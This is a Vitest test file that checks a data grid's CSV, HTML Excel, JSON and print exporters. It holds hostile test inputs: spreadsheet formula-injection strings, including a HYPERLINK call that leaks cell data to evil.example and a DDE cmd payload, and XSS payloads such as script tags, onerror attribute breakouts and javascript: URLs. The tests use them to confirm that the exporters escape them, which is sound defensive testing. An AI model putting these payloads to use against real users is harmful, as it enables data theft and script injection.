import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { exportToCsv, exportToExcel, exportToJson, printGrid } from './index';
import type { GridColDef, GridGroupedExportRow, GridRowModel } from '../../types';

// --- intercept downloads so the Blob content and the file name can be read ---

let capturedBlob: Blob | null = null;
let capturedName: string | null = null;
const origCreateObjectURL = URL.createObjectURL;
const origRevokeObjectURL = URL.revokeObjectURL;
const origClick = HTMLAnchorElement.prototype.click;

beforeEach(() => {
    capturedBlob = null;
    capturedName = null;
    URL.createObjectURL = (blob: Blob) => { capturedBlob = blob; return 'blob:mock'; };
    URL.revokeObjectURL = () => {};
    HTMLAnchorElement.prototype.click = function (this: HTMLAnchorElement) { capturedName = this.download; };
});

afterEach(() => {
    URL.createObjectURL = origCreateObjectURL;
    URL.revokeObjectURL = origRevokeObjectURL;
    HTMLAnchorElement.prototype.click = origClick;
    vi.restoreAllMocks();
});

const BOM = String.fromCharCode(0xfeff);

async function text(): Promise<string> {
    const content = await capturedBlob!.text();
    return content.startsWith(BOM) ? content.slice(1) : content;
}

async function csvLines(): Promise<string[]> {
    return (await text()).split('\n').filter(line => line !== '');
}

/** A CSV field as the exporter writes it: quoted when it contains a comma. */
const csvField = (value: string): string => (value.includes(',') ? `"${value}"` : value);

async function json<T>(): Promise<T> {
    return JSON.parse(await text()) as T;
}

type Row = GridRowModel & { id: number; dept: string; name: string; salary: number };

const people: Row[] = [
    { id: 1, dept: 'Eng', name: 'Alice', salary: 100 },
    { id: 2, dept: 'Eng', name: 'Bob', salary: 200 },
    { id: 3, dept: 'Ops', name: 'Cara', salary: 700 },
];

const grouped: GridGroupedExportRow[] = [
    { type: 'group-header', depth: 0, groupField: 'dept', groupValue: 'Eng' },
    { type: 'leaf', depth: 1, row: people[0] },
    { type: 'leaf', depth: 1, row: people[1] },
    { type: 'group-subtotal', depth: 0, groupField: 'dept', groupValue: 'Eng', aggregatedValues: { salary: 300 } },
    { type: 'group-header', depth: 0, groupField: 'dept', groupValue: 'Ops' },
    { type: 'leaf', depth: 1, row: people[2] },
    { type: 'group-subtotal', depth: 0, groupField: 'dept', groupValue: 'Ops', aggregatedValues: { salary: 700 } },
    { type: 'grand-total', depth: 0, aggregatedValues: { salary: 1000 } },
];

// ─── CSV ──────────────────────────────────────────────────────────────────────

describe('exportToCsv — escaping', () => {
    it('quotes a value that contains the configured delimiter', async () => {
        exportToCsv([{ id: 1, a: 'x;y', b: 'z' }], [{ field: 'a' }, { field: 'b' }], { delimiter: ';' });
        expect((await csvLines())[1]).toBe('"x;y";z');
    });

    it('quotes a value that contains a tab when the delimiter is a tab', async () => {
        exportToCsv([{ id: 1, a: 'x\ty', b: 'z' }], [{ field: 'a' }, { field: 'b' }], { delimiter: '\t' });
        expect((await csvLines())[1]).toBe('"x\ty"\tz');
    });

    it('quotes a value that contains a bare carriage return', async () => {
        exportToCsv([{ id: 1, a: 'line1\rline2' }], [{ field: 'a' }]);
        expect((await csvLines())[1]).toBe('"line1\rline2"');
    });

    it('prefixes text that starts with a formula character so spreadsheets do not evaluate it', async () => {
        exportToCsv(
            [{ id: 1, a: '=HYPERLINK("http://evil.example/?x="&A2,"Click")', b: "+1+cmd|' /C calc'!A0", c: '@SUM(1)', d: '-2+3', e: '\t=1' }],
            [{ field: 'a' }, { field: 'b' }, { field: 'c' }, { field: 'd' }, { field: 'e' }],
        );
        const line = (await csvLines())[1];
        expect(line).toBe(`"'=HYPERLINK(""http://evil.example/?x=""&A2,""Click"")",'+1+cmd|' /C calc'!A0,'@SUM(1),'-2+3,'\t=1`);
    });

    it('leaves negative numbers and plain signed numeric text untouched', async () => {
        exportToCsv(
            [{ id: 1, n: -5, s: '-12.50', f: -3 }],
            [{ field: 'n' }, { field: 's' }, { field: 'f', valueFormatter: ({ value }) => `-$${Math.abs(Number(value))}` }],
        );
        expect((await csvLines())[1]).toBe('-5,-12.50,-$3');
    });

    it('neutralises formulas in headers and group labels too', async () => {
        const g: GridGroupedExportRow[] = [
            { type: 'group-header', depth: 0, groupField: 'name', groupValue: 'x', groupLabel: '=cmd()' },
            { type: 'leaf', depth: 1, row: { id: 1, name: 'x' } },
        ];
        exportToCsv([], [{ field: 'name', headerName: '@evil' }], { groupedRows: g });
        const lines = await csvLines();
        expect(lines[0]).toBe("'@evil");
        expect(lines[1]).toBe("'=cmd()");
    });

    it('can opt out of formula escaping', async () => {
        exportToCsv([{ id: 1, a: '=1+1' }], [{ field: 'a' }], { escapeFormulas: false });
        expect((await csvLines())[1]).toBe('=1+1');
    });
});

describe('exportToCsv — encoding', () => {
    it('starts with a UTF-8 byte-order mark so Excel reads non-ASCII text', async () => {
        exportToCsv([{ id: 1, a: 'München' }], [{ field: 'a' }]);
        const bytes = new Uint8Array(await capturedBlob!.arrayBuffer());
        expect([bytes[0], bytes[1], bytes[2]]).toEqual([0xef, 0xbb, 0xbf]);
    });

    it('omits the byte-order mark when bom is false', async () => {
        exportToCsv([{ id: 1, a: 'x' }], [{ field: 'a' }], { bom: false });
        const bytes = new Uint8Array(await capturedBlob!.arrayBuffer());
        expect(bytes[0]).toBe('a'.charCodeAt(0));
    });
});

describe('exports — column exclusion', () => {
    const cols: GridColDef[] = [
        { field: 'name', headerName: 'Name' },
        { field: 'spacer', headerName: 'SPACERCOL', isSpacer: true },
    ];

    it('CSV skips spacer columns', async () => {
        exportToCsv(people, cols);
        expect(await text()).not.toContain('SPACERCOL');
    });

    it('HTML Excel skips spacer columns', async () => {
        exportToExcel(people, cols);
        expect(await text()).not.toContain('SPACERCOL');
    });

    it('JSON skips spacer columns', async () => {
        exportToJson(people.map(p => ({ ...p, spacer: 'S' })), cols);
        const out = await json<Record<string, unknown>[]>();
        expect(Object.keys(out[0])).toEqual(['name']);
    });
});

describe('exports — valueFormatter for missing values', () => {
    const owner: GridColDef = { field: 'owner', valueFormatter: ({ value }) => (value == null ? 'Unassigned' : String(value)) };

    it('CSV runs the formatter for null values, as the grid does', async () => {
        exportToCsv([{ id: 1, owner: null }], [owner]);
        expect((await csvLines())[1]).toBe('Unassigned');
    });

    it('HTML Excel runs the formatter for null values', async () => {
        exportToExcel([{ id: 1, owner: null }], [owner]);
        expect(await text()).toContain('Unassigned');
    });

    it('a formatter that throws on a missing value exports an empty cell', async () => {
        const strict: GridColDef = { field: 'n', valueFormatter: ({ value }) => (value as number).toFixed(2) };
        exportToCsv([{ id: 1, n: null }, { id: 2, n: 3 }], [strict]);
        expect((await text()).split('\n')).toEqual(['n', '', '3.00', '']);
    });
});

describe('exports — selectedRows', () => {
    it('filters a large selection in linear time', () => {
        const rows = Array.from({ length: 50_000 }, (_, i) => ({ id: `row-${i}`, a: i }));
        const selected = rows.map(r => r.id);
        const includes = vi.spyOn(Array.prototype, 'includes');
        exportToCsv(rows, [{ field: 'a' }], { selectedRows: selected });
        const calls = includes.mock.calls.length;
        includes.mockRestore();
        // A per-row selectedRows.includes() scan is O(rows x selected): 37 s for 100k string ids.
        expect(calls).toBeLessThan(1000);
    });

    it('a selection takes precedence over groupedRows: the selected rows are exported flat (CSV)', async () => {
        exportToCsv(people, [{ field: 'name' }], { groupedRows: grouped, selectedRows: [1] });
        expect(await csvLines()).toEqual(['name', 'Alice']);
    });

    it('a selection takes precedence over groupedRows (HTML Excel)', async () => {
        exportToExcel(people, [{ field: 'name' }], { groupedRows: grouped, selectedRows: [1] });
        const html = await text();
        expect(html).toContain('Alice');
        expect(html).not.toContain('Bob');
        expect(html).not.toContain('Subtotal');
    });

    it('a selection takes precedence over groupedRows (JSON)', async () => {
        exportToJson(people, [{ field: 'name' }], { groupedRows: grouped, selectedRows: [1] });
        expect(await json<unknown>()).toEqual([{ name: 'Alice' }]);
    });

    it('recomputes the totals row over the selected rows (CSV)', async () => {
        exportToCsv(people, [{ field: 'salary', type: 'number' }], {
            selectedRows: [1], aggregationResult: { salary: 1000 }, aggregationModel: { salary: 'sum' },
        });
        expect(await csvLines()).toEqual(['salary', '100', 'SUM', '100']);
    });

    it('recomputes the totals over the selected rows (JSON)', async () => {
        exportToJson(people, [{ field: 'salary', type: 'number' }], {
            selectedRows: [1, 2], aggregationResult: { salary: 1000 }, aggregationModel: { salary: 'sum' },
        });
        const out = await json<{ aggregation: { values: Record<string, unknown> } }>();
        expect(out.aggregation.values.salary).toBe(300);
    });

    it('keeps the caller totals when no selection narrows the export', async () => {
        exportToCsv(people, [{ field: 'salary', type: 'number' }], {
            aggregationResult: { salary: 5 }, aggregationModel: { salary: 'sum' },
        });
        expect((await csvLines()).slice(-1)).toEqual(['5']);
    });
});

describe('exports — aggregate formatting', () => {
    const currency: GridColDef = { field: 'amount', type: 'number', valueFormatter: ({ value }) => `$${Number(value).toFixed(2)}` };

    it('count is not run through a currency valueFormatter', async () => {
        exportToCsv([{ id: 1, amount: 5 }, { id: 2, amount: 7 }], [currency], {
            aggregationResult: { amount: 2 }, aggregationModel: { amount: 'count' },
        });
        expect((await csvLines()).slice(-2)).toEqual(['COUNT', '2']);
    });

    it('sum still uses the column valueFormatter', async () => {
        exportToCsv([{ id: 1, amount: 5 }], [currency], {
            aggregationResult: { amount: 5 }, aggregationModel: { amount: 'sum' },
        });
        expect((await csvLines()).slice(-1)).toEqual(['$5.00']);
    });

    it('a valueFormatter that reads row fields does not abort the export', async () => {
        const cols: GridColDef<GridRowModel & { cur: { sym: string } }>[] = [
            { field: 'amount', valueFormatter: ({ value, row }) => `${row.cur.sym}${String(value)}` },
        ];
        exportToCsv([{ id: 1, amount: 1500, cur: { sym: '€' } }], cols, {
            aggregationResult: { amount: 1500 }, aggregationModel: { amount: 'sum' },
        });
        expect((await csvLines()).slice(-3)).toEqual(['€1500', 'SUM', csvField((1500).toLocaleString())]);
    });

    it('min / max on a date column reach the valueFormatter as a Date', async () => {
        const cols: GridColDef[] = [{ field: 'd', type: 'date', valueFormatter: ({ value }) => (value as Date).toISOString().slice(0, 10) }];
        const d = new Date(Date.UTC(2024, 0, 15));
        exportToCsv([{ id: 1, d }], cols, { aggregationResult: { d: d.getTime() }, aggregationModel: { d: 'min' } });
        expect((await csvLines()).slice(-1)).toEqual(['2024-01-15']);
    });

    it('keeps the first column aggregate next to the Subtotal / Grand Total label', async () => {
        const cols: GridColDef[] = [{ field: 'salary', type: 'number' }, { field: 'name' }];
        exportToCsv([], cols, { groupedRows: grouped, aggregationModel: { salary: 'sum' } });
        const lines = await csvLines();
        expect(lines).toContain('Subtotal: 300,');
        expect(lines[lines.length - 1]).toBe(`${csvField(`Grand Total: ${(1000).toLocaleString()}`)},`);
    });

    it('HTML Excel keeps the first column aggregate next to the label', async () => {
        const cols: GridColDef[] = [{ field: 'salary', type: 'number' }, { field: 'name' }];
        exportToExcel([], cols, { groupedRows: grouped, aggregationModel: { salary: 'sum' } });
        expect(await text()).toContain('Subtotal: 300');
    });
});

// ─── HTML Excel ───────────────────────────────────────────────────────────────

describe('exportToExcel (HTML .xls)', () => {
    it('escapes the sheet name inside the XML island', async () => {
        exportToExcel(people, [{ field: 'name' }], { sheetName: 'R&D <draft> -->' });
        const html = await text();
        expect(html).toContain('<x:Name>R&amp;D &lt;draft&gt; --&gt;</x:Name>');
    });

    it('replaces characters Excel rejects in sheet names and cuts the name to 31 characters', async () => {
        exportToExcel(people, [{ field: 'name' }], { sheetName: 'Sales 2024/25: a very long sheet name' });
        const name = /<x:Name>([^<]*)<\/x:Name>/.exec(await text())![1];
        expect(name).toBe('Sales 2024-25- a very long shee');
    });

    it('marks text cells as text so Excel keeps leading zeros and long ids', async () => {
        exportToExcel([{ id: 1, zip: '00501', amount: 5 }], [{ field: 'zip' }, { field: 'amount', type: 'number' }]);
        const html = await text();
        expect(html).toContain('mso-number-format:"\\@"');
        expect(html).toContain('<td class="ogx-xls-text">00501</td>');
        expect(html).toContain('<td>5</td>');
    });

    it('prefixes formula text in cells', async () => {
        exportToExcel([{ id: 1, a: '=1+1' }], [{ field: 'a' }]);
        // &#039; is the escaped apostrophe prefix
        expect(await text()).toContain('>&#039;=1+1</td>');
    });

    it('writes a .xls file when asked for .xlsx, because the content is HTML', async () => {
        const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
        exportToExcel(people, [{ field: 'name' }], { fileName: 'data.xlsx' });
        expect(capturedName).toBe('data.xls');
        expect(warn).toHaveBeenCalled();
    });

    it('defaults to export.xls', () => {
        exportToExcel(people, [{ field: 'name' }]);
        expect(capturedName).toBe('export.xls');
    });
});

// ─── JSON ─────────────────────────────────────────────────────────────────────

describe('exportToJson', () => {
    it('grouped subtotals and grandTotal contain only exported columns', async () => {
        const cols: GridColDef[] = [{ field: 'dept' }, { field: 'name' }, { field: 'salary', exportable: false }];
        const g: GridGroupedExportRow[] = grouped.map(e => (e.aggregatedValues ? { ...e, aggregatedValues: { ...e.aggregatedValues, name: 2 } } : e));
        exportToJson([], cols, { groupedRows: g });
        const out = await json<{ groups: { rows: Record<string, unknown>[]; subtotals: Record<string, unknown> }[]; grandTotal: Record<string, unknown> }>();
        expect(out.groups[0].rows[0]).not.toHaveProperty('salary');
        expect(out.groups[0].subtotals).toEqual({ name: 2 });
        expect(out.grandTotal).toEqual({ name: 2 });
    });

    it('writes flat aggregation values as raw numbers, as documented', async () => {
        exportToJson(people, [{ field: 'salary', type: 'number' }], {
            aggregationResult: { salary: 8320000 }, aggregationModel: { salary: 'sum' },
        });
        const out = await json<{ aggregation: { labels: Record<string, unknown>; values: Record<string, unknown> } }>();
        expect(out.aggregation).toEqual({ labels: { salary: 'SUM' }, values: { salary: 8320000 } });
    });
});

// ─── Print ────────────────────────────────────────────────────────────────────

interface FakePrintWindow {
    closed: boolean;
    document: { write: (s: string) => void; open: () => void; close: () => void; title: string; body: { innerHTML: string } };
    focus: () => void;
    print: () => void;
    close: () => void;
    onload: null | (() => void);
}

function fakePrintWindow(): { win: FakePrintWindow; writes: string[] } {
    const writes: string[] = [];
    const win: FakePrintWindow = {
        closed: false,
        document: { write: (s: string) => { writes.push(s); }, open: () => {}, close: () => {}, title: '', body: { innerHTML: '' } },
        focus: () => {},
        print: () => {},
        close: () => { win.closed = true; },
        onload: null,
    };
    vi.spyOn(window, 'open').mockReturnValue(win as unknown as Window);
    return { win, writes };
}

describe('printGrid — HTML injection', () => {
    it('escapes the title inside <title>', async () => {
        const { writes } = fakePrintWindow();
        await printGrid(people, [{ field: 'name' }], '</title><script>alert(document.domain)</script>');
        const html = writes[writes.length - 1];
        expect(html).not.toContain('<script>');
        expect(html).toContain('<title>&lt;/title&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</title>');
    });

    it('escapes image URLs and alt text so they cannot break out of the attribute', async () => {
        const { writes } = fakePrintWindow();
        await printGrid([{ id: 1, avatar: 'https://x.example/a.png" onerror="alert(1)' }],
            [{ field: 'avatar', type: 'image', headerName: 'A" onload="x' }]);
        const html = writes[writes.length - 1];
        expect(html).not.toContain('" onerror="');
        expect(html).not.toContain('" onload="');
        expect(html).toContain('src="https://x.example/a.png&quot; onerror=&quot;alert(1)"');
        expect(html).toContain('alt="A&quot; onload=&quot;x"');
    });

    it('escapes image cells in grouped prints', async () => {
        const { writes } = fakePrintWindow();
        await printGrid([], [{ field: 'avatar', type: 'image' }], {
            groupedRows: [{ type: 'leaf', depth: 1, row: { id: 1, avatar: '"><script>alert(1)</script>' } }],
        });
        expect(writes[writes.length - 1]).not.toContain('<script>');
    });

    it('does not use javascript: or other non-image URLs as an image source', async () => {
        const { writes } = fakePrintWindow();
        await printGrid([{ id: 1, avatar: 'javascript:alert(1)' }, { id: 2, avatar: '/avatars/2.png' }, { id: 3, avatar: 'data:image/png;base64,AAAA' }],
            [{ field: 'avatar', type: 'image' }]);
        const html = writes[writes.length - 1];
        expect(html).not.toContain('src="javascript:');
        expect(html).toContain('javascript:alert(1)</td>');
        expect(html).toContain('src="/avatars/2.png"');
        expect(html).toContain('src="data:image/png;base64,AAAA"');
    });

    it('escapes the error message shown when building the table fails', async () => {
        const { win } = fakePrintWindow();
        vi.spyOn(console, 'error').mockImplementation(() => {});
        const cols: GridColDef[] = [{ field: 'a', valueGetter: () => { throw new Error('<img src=x onerror="window.__pwned=1">'); } }];
        await printGrid([{ id: 1, a: 1 }], cols);
        expect(win.document.body.innerHTML).not.toContain('<img');
        expect(win.document.body.innerHTML).toContain('&lt;img src=x onerror=&quot;window.__pwned=1&quot;&gt;');
    });

    it('a selection takes precedence over groupedRows', async () => {
        const { writes } = fakePrintWindow();
        await printGrid(people, [{ field: 'name' }], { groupedRows: grouped, selectedRows: [3] });
        const html = writes[writes.length - 1];
        expect(html).toContain('Cara');
        expect(html).not.toContain('Alice');
    });
});
